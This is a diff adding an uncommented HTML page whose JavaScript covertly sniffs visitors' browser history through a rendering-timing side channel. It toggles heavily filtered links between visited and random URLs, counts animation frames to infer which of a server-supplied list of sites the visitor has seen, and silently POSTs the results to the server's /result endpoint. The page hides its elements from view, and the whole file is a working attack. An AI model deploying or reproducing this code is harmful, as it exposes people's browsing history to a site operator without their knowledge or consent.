@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+    <style>
+        #out a {
+            transform: perspective(100px) rotateY(10deg);
+            filter: contrast(200%) drop-shadow(16px 16px 10px #fefefe) saturate(200%);
+            color: red;
+        }
+
+        #out a:visited {
+            color: blue;
+        }
+
+        #out {
+            z-index: -20;
+        }
+
+        .hidden {
+            background: #fff;
+            width: 100%;
+        }
+
+
+    </style>
+</head>
+
+<body>
+
+<input id="urls" type="hidden" name="urls" value="{{.urls}}">
+<input id="textlines" type="hidden" value="" size="6" style="border: 0px">
+
+<div style="visibility:hidden">Current URL: <span id="currentURL"></span></div>
+<div class="hidden"></div>
+<div id="out">
+</div>
+<script>
+    var urls = [location.href, 'http://notvisited' + ((Math.random() * 100000000) | 0) + '.foo'];
+    var ispc = true;
+    requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame;
+    var out = document.getElementById('out');
+    var currentURLout = document.getElementById('currentURL');
+    var resultEle = document.getElementById('result');
+    var linkspans = [];
+    var timespans = [];
+    var statisticalTime = 100;
+    var counter = 0;
+    var posTimes = [];
+    var negTimes = [];
+    var stop = true;
+    var start;
+    var currentUrl = 0;
+    var calibIters = 1;
+    var INIT_N_PC = 50;
+    var INIT_N_MOBILE = 10;
+    var ITER_STEP = 1;
+    var stage = 0;
+    var index = 1;
+    var N = [0];
+    var UV = [0];
+    var V = [0];
+    var D = [0];
+    var VAR = [0];
+
+    let result = new Map
+
+    function initStats() {
+        currentUrl = 0;
+        start = NaN;
+        counter = 0;
+        posTimes = [];
+        negTimes = [];
+        if (stop) {
+            stop = false;
+            loop();
+        }
+    }
+
+    function updateParams() {
+        textLines = parseInt(document.getElementById('textlines').value);
+        console.log("textLines:", textLines)
+        textLen = 5
+        currentURLout.parentElement.style.visibility = "visible";
+        write();
+        resetLinks();
+        initStats();
+    }
+
+    function write() {
+        var s = '';
+        var url = urls[currentUrl];
+        var text = '';
+        while (text.length < textLen)
+            text += '#';
+        for (var i = 0; i < textLines; i++) {
+            s += "<a href=" + url;
+            s += ">" + text;
+            s += "</a> ";
+        }
+        out.innerHTML = s;
+    }
+
+    var isPC = function () {
+        var userAgentInfo = navigator.userAgent.toLowerCase();
+        var Agents = new Array("android", "iphone", "symbianOS", "windows phone", "ipad", "ipod");
+        var flag = true;
+        for (var v = 0; v < Agents.length; v++) {
+            if (userAgentInfo.indexOf(Agents[v]) > 0) {
+                flag = false;
+                break;
+            }
+        }
+        return flag;
+    }
+
+    function updateLinks() {
+        var url = urls[currentUrl];
+        for (var i = 0; i < out.children.length; i++) {
+            out.children[i].href = url;
+            out.children[i].style.color = 'red';
+            out.children[i].style.color = '';
+        }
+    }
+
+    function resetLinks() {
+        for (var i = 0; i < out.children.length; i++) {
+            out.children[i].href = 'http://' + Math.random() + '.asd';
+            out.children[i].style.color = 'red';
+            out.children[i].style.color = '';
+        }
+    }
+
+    function variance(arr) {
+        let s,
+            ave,
+            sum = 0,
+            sums = 0,
+            len = arr.length;
+        for (let i = 0; i < len; i++) {
+            sum += Number(arr[i]);
+        }
+        ave = sum / len;
+        for (let i = 0; i < len; i++) {
+            sums += (Number(arr[i]) - ave) * (Number(arr[i]) - ave)
+        }
+        s = (sums / len);
+        return s;
+    }
+
+    function average(list) {
+        var tmp = 0;
+        list.forEach(element => {
+            tmp += element;
+        });
+        return tmp / list.length;
+    }
+
+    function argtop2() {
+        var top1 = top2 = 1;
+        for (var i = 1; i < N.length; i++) {
+            if ((D[i]) >= (D[top1]))
+                top1 = i;
+        }
+        for (var i = 1; i < N.length; i++) {
+            if (i != top1 && (D[i]) >= (D[top2]))
+                top2 = i;
+        }
+        return [top1, top2];
+    }
+
+    function loop(timestamp) {
+        if (stop) return;
+        if (!start) start = timestamp;
+        if (timestamp > start + statisticalTime) {
+            if (currentUrl == 0) {
+                posTimes.push(counter);
+            }
+            if (currentUrl == 1) {
+                negTimes.push(counter);
+                if (negTimes.length >= calibIters) {
+                    var diffArr = [];
+                    for (var i = 0; i < posTimes.length; i++) {
+                        diffArr[i] = negTimes[i] - posTimes[i];
+                    }
+                    V[index] = average(posTimes);
+                    D[index] = average(diffArr) > 1 ? average(diffArr) : 1;
+                    VAR[index] = variance(diffArr);
+
+                    var dpl = D[index] / N[index];
+                    if (stage == 0) {
+                        if (D[index] <= D[index - 1]) {
+
+                            stage = 1;
+
+                        } else {
+                            ITER_STEP = ITER_STEP * 2;
+                            index++;
+                            N[index] = N[index - 1] + parseInt(ITER_STEP / dpl);
+
+                            stop = true;
+                            updateParams();
+                            return;
+                        }
+                    }
+                    if (stage == 1) {
+                        ITER_STEP = 1;
+                        index++;
+                        N[index] = N[index - 1] + parseInt(ITER_STEP / dpl);
+                        stage = 2;
+                        stop = true;
+                        updateParams();
+                        return;
+                    }
+                    if (stage == 2) {
+                        var top2 = argtop2();
+                        if (VAR[top2[0]] > VAR[top2[1]])
+                            index = top2[0];
+                        else
+                            index = top2[1];
+                    }
+
+                    write()
+
+
+                }
+            }
+            if (currentUrl >= 2) {
+
+                threshold = V[index] + D[index] * .5;
+
+                result[urls[currentUrl]] = {
+                    counter: counter,
+                    visited: counter <= threshold ? 1 : 0
+                }
+            }
+            currentUrl++;
+
+            if (currentUrl == 2 && (negTimes.length < calibIters || posTimes.length < calibIters))
+                currentUrl = 0;
+            if (currentUrl == urls.length) {
+                stop = true;
+                console.log(result)
+                sendData(result)
+            } else {
+                counter = 0;
+                start = NaN;
+            }
+        }
+        if (counter % 2 == 0) {
+            updateLinks();
+        } else {
+            resetLinks();
+        }
+        counter++;
+        currentURLout.textContent = urls[currentUrl];
+        requestAnimationFrame(loop);
+    }
+
+    function initParms() {
+        if (isPC()) {
+            N[index] = INIT_N_PC;
+        } else {
+            ispc = false;
+            N[index] = INIT_N_MOBILE;
+        }
+        document.getElementById('textlines').value = N[index];
+        console.log(`N:`, N)
+        console.log(`index:`, index)
+
+        stage = 0;
+    }
+
+    (function setupLinks() {
+
+        top100 = JSON.parse((document.querySelector("#urls")).getAttribute("value"))
+        for (var i = 0; i < top100.length; i++) {
+            urls.push(top100[i]);
+        }
+        initParms();
+        updateParams()
+    })()
+
+
+    function sendData(data) {
+        let formData = new FormData()
+        formData.append("data", JSON.stringify(data))
+
+        let XHR = new XMLHttpRequest()
+        XHR.open('POST', '/result');
+        XHR.send(formData);
+    }
+</script>
+</body>
+</html>
